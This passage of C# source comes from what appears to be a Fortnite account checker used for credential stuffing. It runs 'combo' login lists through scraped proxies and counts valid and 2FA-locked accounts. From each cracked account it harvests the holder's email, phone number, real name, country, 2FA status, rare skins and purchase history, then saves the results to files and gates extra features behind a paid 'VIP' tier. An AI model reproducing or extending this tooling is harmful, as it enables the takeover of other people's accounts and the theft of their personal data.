                                    string purchase8 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][7].ToString());
                                    sw.WriteLine("Purchase #8 --> " + purchase8);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #5 --> " + purchase8);
                                    }
                                }
                                catch
                                {
                                }

                                try
                                {
                                    string purchase9 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][8].ToString());
                                    sw.WriteLine("Purchase #9 --> " + purchase9);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #9 --> " + purchase9);
                                    }
                                }
                                catch
                                {
                                }

                                try
                                {
                                    string purchase10 = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["receipts"][9].ToString());
                                    sw.WriteLine("Purchase #10 --> " + purchase10);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Purchase #10 --> " + purchase10);
                                    }
                                }
                                catch
                                {
                                }
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                sw.WriteLine("Vbucks Purchase History");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("Vbucks Purchase History");
                                    FnBattleRoyalLB.Items.Add("");
                                }
                                sw.WriteLine(Environment.NewLine);
                                //Bought Vbucks Before
                                //1k Vbucks
                                try
                                {
                                    string onekVbucks = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["fulfillmentCounts"]["FN_1000_POINTS"].ToString());
                                    int onekVbucksint = Int32.Parse(onekVbucks);
                                    int MoneySpentTotal = 10 * onekVbucksint;
                                    TotalMoneyzSpent = TotalMoneyzSpent + MoneySpentTotal;
                                    string onekVbucksstring = MoneySpentTotal.ToString();
                                    sw.WriteLine("Has Bought 1,000 Vbucks " + onekVbucks + " Different Time(s)");
                                    sw.WriteLine("Has Spent $" + onekVbucksstring + " On 1,000 Vbucks");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Bought 1,000 Vbucks " + onekVbucks + " Different Time(s)");
                                        FnBattleRoyalLB.Items.Add("Has Spent $" + onekVbucksstring + " On 1,000 Vbucks");
                                    }
                                }
                                catch { }
                                //2,500 Vbucks
                                try
                                {
                                    string twokVbucks = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["fulfillmentCounts"]["FN_2800_POINTS"].ToString());
                                    int TwokVbucksint = Int32.Parse(twokVbucks);
                                    int MoneySpentTotalTwok = 25 * TwokVbucksint;
                                    TotalMoneyzSpent = TotalMoneyzSpent + MoneySpentTotalTwok;
                                    string TwokVbucksstring = MoneySpentTotalTwok.ToString();
                                    sw.WriteLine("Has Bought 2,800 Vbucks " + twokVbucks + " Different Time(s)");
                                    sw.WriteLine("Has Spent $" + TwokVbucksstring + " On 2,500 Vbucks");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Bought 2,800 Vbucks " + twokVbucks + " Different Time(s)");
                                        FnBattleRoyalLB.Items.Add("Has Spent $" + TwokVbucksstring + " On 2,500 Vbucks");
                                    }
                                }
                                catch { }
                                //5,000 Vbucks
                                try
                                {
                                    string FivekVbucks = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["fulfillmentCounts"]["FN_5000_POINTS"].ToString());
                                    int FivekVbucksint = Int32.Parse(FivekVbucks);
                                    int MoneySpentTotalFivek = 40 * FivekVbucksint;
                                    TotalMoneyzSpent = TotalMoneyzSpent + MoneySpentTotalFivek;
                                    string FivekVbucksstring = MoneySpentTotalFivek.ToString();
                                    sw.WriteLine("Has Bought 7,500 Vbucks " + FivekVbucks + " Different Time(s)");
                                    sw.WriteLine("Has Spent $" + FivekVbucksstring + " On 7,500 Vbucks");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Bought 7,500 Vbucks " + FivekVbucks + " Different Time(s)");
                                        FnBattleRoyalLB.Items.Add("Has Spent $" + FivekVbucksstring + " On 7,500 Vbucks");
                                    }
                                }
                                catch { }
                                //7,500 Vbucks
                                try
                                {
                                    string sevenkVbucks = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["fulfillmentCounts"]["FN_7500_POINTS"].ToString());
                                    int SevenkVbucksint = Int32.Parse(sevenkVbucks);
                                    int MoneySpentTotalSevenk = 60 * SevenkVbucksint;
                                    TotalMoneyzSpent = TotalMoneyzSpent + MoneySpentTotalSevenk;
                                    string SevenkVbucksstring = MoneySpentTotalSevenk.ToString();
                                    sw.WriteLine("Has Bought 7,500 Vbucks " + sevenkVbucks + " Different Time(s)");
                                    sw.WriteLine("Has Spent $" + SevenkVbucksstring + " On 7,500 Vbucks");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Bought 7,500 Vbucks " + sevenkVbucks + " Different Time(s)");
                                        FnBattleRoyalLB.Items.Add("Has Spent $" + SevenkVbucksstring + " On 7,500 Vbucks");
                                    }
                                }
                                catch { }
                                //13,500 Vbucks
                                try
                                {
                                    string thirteenkVbucks = (PurchaseJson["stats"]["attributes"]["in_app_purchases"]["fulfillmentCounts"]["FN_13500_POINTS"].ToString());
                                    int ThirteenkVbucksint = Int32.Parse(thirteenkVbucks);
                                    int MoneySpentTotalThirteenk = 100 * ThirteenkVbucksint;
                                    TotalMoneyzSpent = TotalMoneyzSpent + MoneySpentTotalThirteenk;
                                    string ThirteenkVbucksstring = MoneySpentTotalThirteenk.ToString();
                                    sw.WriteLine("Has Bought 13,500 Vbucks " + thirteenkVbucks + " Different Time(s)");
                                    sw.WriteLine("Has Spent $" + ThirteenkVbucksstring + " On 13,500 Vbucks");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Has Bought 13,500 Vbucks " + thirteenkVbucks + " Different Time(s)");
                                        FnBattleRoyalLB.Items.Add("Has Spent $" + ThirteenkVbucksstring + " On 13,500 Vbucks");
                                    }
                                }
                                catch { }

                                bool BoughtStarterPack1 = x.Contains("AthenaCharacter:cid_090_athena_commando_m_tactical");
                                if (BoughtStarterPack1)
                                {
                                    TotalMoneyzSpent = TotalMoneyzSpent + 5;
                                }
                                bool BoughtStarterPack2 = x.Contains("AthenaCharacter:cid_139_athena_commando_m_fighterpilot");
                                if (BoughtStarterPack2)
                                {
                                    TotalMoneyzSpent = TotalMoneyzSpent + 5;
                                }
                                bool BoughtStarterPack3 = x.Contains("AthenaCharacter:cid_195_athena_commando_f_bling");
                                if (BoughtStarterPack3)
                                {
                                    TotalMoneyzSpent = TotalMoneyzSpent + 5;
                                }
                                bool BoughtStarterPack4 = x.Contains("AthenaCharacter:cid_253_athena_commando_m_militaryfashion2");
                                if (BoughtStarterPack4)
                                {
                                    TotalMoneyzSpent = TotalMoneyzSpent + 5;
                                }
                            }
                            if (CheckAccountInfo.Checked)
                            {
                                // START ACCOUNT INFORMATION //

                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Account Information>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Account Information>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                JToken ProfileInfo = JObject.Parse(a);

                                try
                                {
                                    string AccountIDProfileInfo = (ProfileInfo["id"].ToString());
                                    sw.WriteLine("Account ID: " + AccountIDProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Account ID: " + AccountIDProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string DisplayNameProfileInfo = (ProfileInfo["displayName"].ToString());
                                    sw.WriteLine("Display Name: " + DisplayNameProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Display Name: " + DisplayNameProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string DisplayNameProfileInfo = (ProfileInfo["email"].ToString());
                                    sw.WriteLine("Email Address: " + DisplayNameProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Email Address: " + DisplayNameProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string PhoneNumberNameProfileInfo = (ProfileInfo["phoneNumber"].ToString());
                                    sw.WriteLine("Phone Number: " + PhoneNumberNameProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Phone Number: " + PhoneNumberNameProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string FirstNameProfileInfo = (ProfileInfo["name"].ToString());
                                    sw.WriteLine("First Name: " + FirstNameProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("First Name: " + FirstNameProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string LastNameProfileInfo = (ProfileInfo["lastName"].ToString());
                                    sw.WriteLine("Last Name: " + LastNameProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Last Name: " + LastNameProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string FailedLoginAttempsProfileInfo = (ProfileInfo["failedLoginAttempts"].ToString());
                                    sw.WriteLine("Number Of Failed Logins: " + FailedLoginAttempsProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Number Of Failed Logins: " + FailedLoginAttempsProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string LagLoggedInProfileInfo = (ProfileInfo["lastLogin"].ToString());
                                    sw.WriteLine("Last Login Date: " + LagLoggedInProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Last Login Date: " + LagLoggedInProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string NameChangeCountProfileInfo = (ProfileInfo["numberOfDisplayNameChanges"].ToString());
                                    sw.WriteLine("Number Of Name Changes: " + NameChangeCountProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Number Of Name Changes: " + NameChangeCountProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string CountryProfileInfo = (ProfileInfo["country"].ToString());
                                    sw.WriteLine("Country: " + CountryProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Country: " + CountryProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string LANGProfileInfo = (ProfileInfo["preferredLanguage"].ToString());
                                    sw.WriteLine("Language: " + LANGProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("Language: " + LANGProfileInfo);
                                    }
                                }
                                catch { }
                                try
                                {
                                    string TFAEnabledProfileInfo = (ProfileInfo["tfaEnabled"].ToString());
                                    sw.WriteLine("TFA Enabled: " + TFAEnabledProfileInfo);
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("TFA Enabled: " + TFAEnabledProfileInfo);
                                    }
                                }
                                catch { }
                                // END ACCOUNT INFORMATION //
                            }
                        }
                        sw.WriteLine("--------------------------------------------------------");
                        if (ListBoxDisableText.Checked == false)
                        {
                            FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                        }
                        sw.WriteLine("--------------------DONE CHECKING-------------------------------");
                        if (ListBoxDisableText.Checked == false)
                        {
                            FnBattleRoyalLB.Items.Add("--------------------DONE CHECKING-------------------------------");
                            FnBattleRoyalLB.Items.Add("");
                        }
                        sw.WriteLine(Environment.NewLine);
                        if (ListBoxDisableText.Checked)
                        {
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Clear();
                            }
                        }
                        if (ListBoxDisableText.Checked == false)
                        {
                            FnBattleRoyalLB.EndUpdate();
                        }
                    }
                }));
            }
            catch (Exception ex)
            {

            }
        }

        private bool isCompleted()
        {
            foreach (Thread t in tList)
            {
                if (t.IsAlive)
                    return false;
            }
            return true;
        }

        private void updatestatus()
        {
            try
            {
                base.Invoke(new MethodInvoker(delegate
                {
                    string formattype = "{0:#,###,###.##}";
                    lblValid.Text = string.Format(formattype, validcnt);
                    lblInvalid.Text = string.Format(formattype, invalidcnt);
                    lblErrors.Text = string.Format(formattype, errorcnt);
                    lblRetries.Text = string.Format(formattype, retrycnt);
                    lblChecked.Text = string.Format(formattype, checkedcnt + "/" + Combo.Count);
                    bunifuCircleProgressbar1.Value = checkedcnt;
                    RareSkinsFound.Text = string.Format(formattype, rareskins);
                    STWAccounts.Text = string.Format(formattype, STW);
                    SkullyAccounts.Text = string.Format(formattype, Skully);
                    Renegade.Text = string.Format(formattype, RenegadeCount);
                    TotalVbucks.Text = string.Format(formattype, VbucksFound);
                    TotalSkinsAccrossAccounts.Text = string.Format(formattype, TotalSkinsChecked);
                    GlidersAccrossAccounts.Text = string.Format(formattype, TotalGlidersChecked);
                    GalaxySkinsFound.Text = string.Format(formattype, TotalGalaxyChecked);
                    TotalMoneySpentOnVbucks.Text = string.Format(formattype, "$" + TotalMoneyzSpent);
                    Locked2FA.Text = string.Format(formattype, lockedCuz2Fa);
                    int TotalCountForAll = validcnt + invalidcnt + errorcnt + retrycnt;
                    TotalNumberOfChecks.Text = string.Format(formattype, index);
                    int number = Process.GetCurrentProcess().Threads.Count;
                    TotalThreadsRan.Text = string.Format(formattype, number);
                }));
            }
            catch (Exception)
            {
                MessageBox.Show("ERROR");
            }
        }

        private void MainFunctions_Click(object sender, EventArgs e)
        {

        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (!IfPaauseTheList.Checked)
            {
                if (MessageBox.Show("Are you sure you want to stop checking?", "Cancel", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                    return;
                if (RemoveWhenChecked.Checked)
                {
                    HashSet<string> OldCombo = Combo;
                    string LeftoverCombos = String.Join(Environment.NewLine, OldCombo);
                    using (StreamWriter NoneCheckedNeedChecked = File.AppendText("Accounts Which Did Not Get Checked.txt"))
                    {
                        NoneCheckedNeedChecked.WriteLine(LeftoverCombos);
                    }
                }
                _Run = false;
                _IsGood = false;
                btnStop.Enabled = false;
            }
            else if (IfPaauseTheList.Checked)
            {
                if (MessageBox.Show("Are you sure you want to pause checking?", "Cancel", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                    return;
                if (RemoveWhenChecked.Checked)
                {
                    HashSet<string> OldCombo = Combo;
                    string LeftoverCombos = String.Join(Environment.NewLine, OldCombo);
                    using (StreamWriter NoneCheckedNeedChecked = File.AppendText("Accounts Which Did Not Get Checked.txt"))
                    {
                        NoneCheckedNeedChecked.WriteLine(LeftoverCombos);
                    }
                }
                _Run = false;
                _IsGood = false;
                btnStop.Enabled = false;
            }
        }

        private void NoAccess()
        {
            //if (MainTabControl.SelectedTab != MainTabControl.TabPages["WelcomeWindow"])
            //{
            //    if (enterprogram == false)
            //    {
            //        WelcomeWindow.Show();
            //        MainTabControl.SelectedTab = MainTabControl.TabPages["WelcomeWindow"];
            //        MessageBox.Show("Please Login before Trying To Use Any Features!");
            //        return;
            //    }
            //}
        }

        private void MainTabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            NoAccess();
            if (MainTabControl.SelectedTab == MainTabControl.TabPages["WelcomeWindow"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Tool <---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["StatsLookupPage"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Account Stats Checker <---->" + "Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["SkinCheckerPage"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["ProgressTab"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Progress ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["OtherSettingsTab"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Other Settings ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["EvenMoreSettings"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Even More Settings ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["Changelog"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Changelog ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["NotifyPage"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Notifications ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["RareSkinsDedication"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Dedicated Rare Item's ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["ColorCustoms"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Customize Colors ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
            else if (MainTabControl.SelectedTab == MainTabControl.TabPages["MiscToolsTabPage"])//your specific tabname
            {
                MainFormTheme.Text = "TCM's Fortnite Skin Checker Misc Tools ---->" + " Welcome [" + Environment.UserName + " " + State + "]" + " <----> Version: " + Version;
            }
        }

        private void closeprogrambut_Click(object sender, EventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void formminimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }

        private void btnClearUsernameList_Click(object sender, EventArgs e)
        {
            lbUsernames.Items.Clear();
        }

        private void btnRemoveSelectedUsers_Click(object sender, EventArgs e)
        {
            var selectedItems = lbUsernames.SelectedItems;
            if (selectedItems.Count > 0)
            {
                for (int i = selectedItems.Count - 1; i >= 0; i--)
                {
                    lbUsernames.Items.Remove(selectedItems[i]);
                }
            }
            else
            {
                Log("No users selected to remove.", nameof(LogType.Error));
            }
        }

        private void btnClearUsername_Click(object sender, EventArgs e)
        {
            txtUsername.Text = "";
        }

        private void btnAddUsername_Click(object sender, EventArgs e)
        {
            if (txtUsername.Text.Trim() != "") lbUsernames.Items.Add(txtUsername.Text);
            txtUsername.Text = "";
        }

        private async void nsButton1_Click(object sender, EventArgs e)
        {
            if (lbUsernames.Items.Count > 0)
            {
                if (cbMode.SelectedIndex == -1)
                {
                    Log("No mode selected.", nameof(LogType.Error));
                    return;
                }
                btnRemoveSelectedUsers.Enabled = false;
                btnClearUsername.Enabled = false;
                btnAddUsername.Enabled = false;
                btnClearUsernameList.Enabled = false;

                var fortniteStatsList = new List<FortniteData>();
                Log("Attempting to gather data...", nameof(LogType.Info));
                foreach (string s in lbUsernames.Items)
                {
                    Log($"Gathering data for user {s}", nameof(LogType.Info));
                    if (PCCheckBox.Checked)
                    {
                        console = "pc";
                    }
                    else if (XboxCheckBox.Checked)
                    {
                        console = "xbox";
                    }
                    else if (PlaystationCheckBox.Checked)
                    {
                        console = "psn";

                    }
                    try
                    {
                        fortniteStatsList.Add(await GetStatsByUsername(FortniteTrackerAPIKey.Text, console, s));
                        username = s;
                    }
                    catch
                    {
                        Log("Please Make Sure You Have All The Information Filled Out!", nameof(LogType.Error));
                        btnRemoveSelectedUsers.Enabled = true;
                        btnClearUsername.Enabled = true;
                        btnAddUsername.Enabled = true;
                        btnClearUsernameList.Enabled = true;
                        return;
                    }
                    Log($"Successfully gathered data for user {s}", nameof(LogType.Info));

                    Log("Delaying for 2s...", nameof(LogType.Info));
                    await Task.Delay(2000);
                    Log("Successfully delayed...", nameof(LogType.Info));
                }
                Log("Successfully gathered data...", nameof(LogType.Info));

                foreach (var stat in fortniteStatsList)
                {
                    switch (cbMode.Text)
                    {
                        case "Solo":
                            AddSeriesToChart(stat.EpicUserHandle, stat.Stats.Solo);
                            break;
                        case "Duo":
                            AddSeriesToChart(stat.EpicUserHandle, stat.Stats.Duo);
                            break;
                        case "Squad":
                            AddSeriesToChart(stat.EpicUserHandle, stat.Stats.Squad);
                            break;
                        case "Lifetime":
                            AddSeriesToChart(stat.EpicUserHandle, stat.LifetimeStats);
                            break;
                    }
                }
                Log("Successfully added series to chart...", nameof(LogType.Info));
                lbUsernames.Items.Clear();
                btnClearUsernameList.Enabled = true;
                btnRemoveSelectedUsers.Enabled = true;
                btnClearUsername.Enabled = true;
                btnAddUsername.Enabled = true;
            }
            else
            {
                Log("No users found in the list.", nameof(LogType.Error));
                btnRemoveSelectedUsers.Enabled = true;
                btnClearUsername.Enabled = true;
                btnAddUsername.Enabled = true;
                btnClearUsernameList.Enabled = true;
            }
        }

        private async Task<FortniteData> GetStatsByUsername(string token, string platform, string username)
        {
            var stats = await new FortniteStats().GetStatsByUsernameAsync(token, platform, username);
            return stats;
        }

        private void AddSeriesToChart(string name, GameStats stats)
        {

            StatsGrid.Rows.Add(name, stats.Matches.ValueInt, stats.Wins.ValueInt, stats.Kills.ValueInt, Convert.ToDouble(stats.Kda.Value), Convert.ToDouble(stats.WinRatio.Value));
            System.IO.File.AppendAllText("StatsLog//StatsLog.txt", "=_=_=_=" + name + " =_=_=_=" + Environment.NewLine + "Username: " + name + Environment.NewLine + "Matches Played - " + stats.Matches.ValueInt + Environment.NewLine + "Times Won - " + stats.Wins.ValueInt + Environment.NewLine + "Amount Of Kills - " + stats.Kills.ValueInt + Environment.NewLine + "Kill/Death Ratio - " + Convert.ToDouble(stats.Kda.Value) + Environment.NewLine + "Win/Loss Ratio - " + Convert.ToDouble(stats.WinRatio.Value) + Environment.NewLine + "=_=_=_=_= END Stats Check =_=_=_=_=" + Environment.NewLine + Environment.NewLine + Environment.NewLine);
        }

        private void AddSeriesToChart(string name, LifetimeStats stats)
        {

            StatsGrid.Rows.Add(name, stats.MatchesPlayed, stats.Wins, stats.Kills, Convert.ToDouble(stats.Kda), Convert.ToDouble(stats.WinPercentage.Replace("%", "")), "Win Ratio");
            System.IO.File.AppendAllText("StatsLog//StatsLog.txt", "=_=_=_=" + name + " =_=_=_=" + Environment.NewLine + "Username: " + name + Environment.NewLine + "Matches Played - " + stats.MatchesPlayed + Environment.NewLine + "Times Won - " + stats.Wins + Environment.NewLine + "Amount Of Kills - " + stats.Kills + Environment.NewLine + "Kill/Death Ratio - " + Convert.ToDouble(stats.Kda) + Environment.NewLine + "Win/Loss Ratio - " + Convert.ToDouble(stats.WinPercentage.Replace("%", "")) + Environment.NewLine + "=_=_=_=_= END Stats Check =_=_=_=_=" + Environment.NewLine + Environment.NewLine + Environment.NewLine);
        }

        private void SaveAPIbtn_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default["API"] = FortniteTrackerAPIKey.Text;
            Settings.Default.Save();
        }

        private void Log(string message, string logType)
        {
            Invoke((MethodInvoker)delegate
            {
                txtLogs.AppendText($@"{DateTime.Now} - {logType}: {message}{Environment.NewLine}");
            });
        }

        private void GetAPIbtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://fortnitetracker.com/site-api");
        }

        private void XboxCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (XboxCheckBox.Checked)
            {
                PCCheckBox.Checked = false;
                PlaystationCheckBox.Checked = false;
            }
        }

        private void PCCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (PCCheckBox.Checked)
            {
                XboxCheckBox.Checked = false;
                PlaystationCheckBox.Checked = false;
            }
        }

        private void PlaystationCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (PlaystationCheckBox.Checked)
            {
                PCCheckBox.Checked = false;
                XboxCheckBox.Checked = false;
            }
        }



        private void NoneVIPAccess()
        {
            MessageBox.Show("VIP Not Found, You Should Consider Getting It :)");
            MessageBox.Show("Also BE SURE To Click The Discord Image To Join The Discord!");
            //Time To Disable Things For None VIP Members
            BlackKnightSaveFile.Checked = false;
            CodenameELFSaveFile.Checked = false;
            CrackshotSaveFile.Checked = false;
            GhoulTrooperSaveFile.Checked = false;
            GingerGunnerSaveFile.Checked = false;
            MerryMarauderSaveFile.Checked = false;
            NogOpsSaveFile.Checked = false;
            RedNosedRaiderSaveFile.Checked = false;
            SkullTrooperSaveFile.Checked = false;
            YuletideRangerSaveFile.Checked = false;
            ScytheSaveFile.Checked = false;
            STWSaveFile.Checked = false;
            VbucksSaveFile.Checked = false;
            PCSaveFile.Checked = false;
            PS4SaveFile.Checked = false;
            XboxSaveFile.Checked = false;
            NintendoSaveFile.Checked = false;
            BlackKnightSaveFile.Enabled = false;
            CodenameELFSaveFile.Enabled = false;
            CrackshotSaveFile.Enabled = false;
            GhoulTrooperSaveFile.Enabled = false;
            MerryMarauderSaveFile.Enabled = false;
            NogOpsSaveFile.Enabled = false;
            RedNosedRaiderSaveFile.Enabled = false;
            SkullTrooperSaveFile.Enabled = false;
            YuletideRangerSaveFile.Enabled = false;
            ScytheSaveFile.Enabled = false;
            STWSaveFile.Enabled = false;
            VbucksSaveFile.Enabled = false;
            PCSaveFile.Enabled = false;
            PS4SaveFile.Enabled = false;
            XboxSaveFile.Enabled = false;
            NintendoSaveFile.Enabled = false;
            SaveUselessAccounts.Checked = true;
            SaveUselessAccounts.Enabled = false;
            CheckForRareItems.Checked = false;
            CheckForRareItems.Enabled = false;
            CheckForTotalItemCount.Checked = false;
            CheckForTotalItemCount.Enabled = false;
            StackedSkinSaver.Checked = false;
            StackedSkinSaver.Enabled = false;
            CeckForLast5Purchases.Checked = false;
            CeckForLast5Purchases.Enabled = false;
            CheckForPastSeasonInformation.Checked = false;
            CheckForPastSeasonInformation.Enabled = false;
            CheckForBattlePassInformation.Checked = false;
            CheckForBattlePassInformation.Enabled = false;
            APISender.Checked = false;
            APISender.Enabled = false;
            RoyaleBomberSaveFile.Checked = false;
            CandyAxeSaveFile.Checked = false;
            RaidersRevengeSaveFile.Checked = false;
            PowerChordSaveFile.Checked = false;
            SgtGreenCloverSaveFile.Checked = false;
            RenegadeSaveFile.Checked = false;
            AerialAssaultTrooperSaveFile.Checked = false;
            RoyaleBomberSaveFile.Enabled = false;
            CandyAxeSaveFile.Enabled = false;
            RaidersRevengeSaveFile.Enabled = false;
            PowerChordSaveFile.Enabled = false;
            SgtGreenCloverSaveFile.Enabled = false;
            RenegadeSaveFile.Enabled = false;
            AerialAssaultTrooperSaveFile.Enabled = false;
            ProxyScraperURL.Text = "";
            ProxyScraperURL.Enabled = false;
            ScrapeSomeProxies.Enabled = false;
            BestProxiesAPI.Text = "";
            BestProxiesAPI.Enabled = false;
            ImportProxiesAPI.Enabled = false;
            SavekeyButton.Enabled = false;
            ClearProxiesButton.Enabled = false;
            CurrentPulledCombos.Enabled = false;
            AmountOfVbucksToSave.Enabled = false;
            SaveSTWTiersToFiles.Checked = false;
            RemoveWhenChecked.Checked = false;
            SaveSTWTiersToFiles.Enabled = false;
            RemoveWhenChecked.Enabled = false;
            ProxyListToScrapeMultiple.Enabled = false;
            FasterScrape.Enabled = false;
            nsButton8.Enabled = false;
            nsButton9.Enabled = false;
            nsButton10.Enabled = false;
            nsButton11.Enabled = false;
            nsButton12.Enabled = false;
            EnableRemoveBadProxies.Checked = false;
            EnableRemoveBadProxies.Enabled = false;
            RemoveProxiesWithErrors.Checked = false;
            RemoveProxiesWithErrors.Enabled = false;
            EnableNotifyEmail.Checked = false;
            EnableNotifyEmail.Enabled = false;
            EmailToNotifyToo.Text = "";
            EmailToNotifyToo.Enabled = false;
            nsButton4.Enabled = false;
            IfStackedChecked.Checked = false;
            SendFinalEmailOnly.Checked = false;
            FinalFileHasTextFile.Checked = false;
            EmailSentTXT.Checked = false;
            EmailSendHTML.Checked = false;
            EnableNotifyEmail.Checked = false;
            EnableTextNowNotify.Checked = false;
            IfStackedChecked.Enabled = false;
            SendFinalEmailOnly.Enabled = false;
            FinalFileHasTextFile.Enabled = false;
            EmailSentTXT.Enabled = false;
            EmailSendHTML.Enabled = false;
            EnableNotifyEmail.Enabled = false;
            EnableTextNowNotify.Enabled = false;
            EmailToNotifyToo.Text = "";
            EmailToNotifyToo.Enabled = false;
            TextNowNotificationsText.Text = "";
            TextNowNotificationsText.Enabled = false;
            nsButton15.Enabled = false;
            nsButton4.Enabled = false;
            nsButton13.Enabled = false;
            nsButton14.Enabled = false;
            IpAddressToTab.Enabled = false;
            BanThereIP.Enabled = false;
            BanTimeText.Enabled = false;
            ScrapedURLs.Enabled = false;
            UrlToScrapeFrom.Enabled = false;
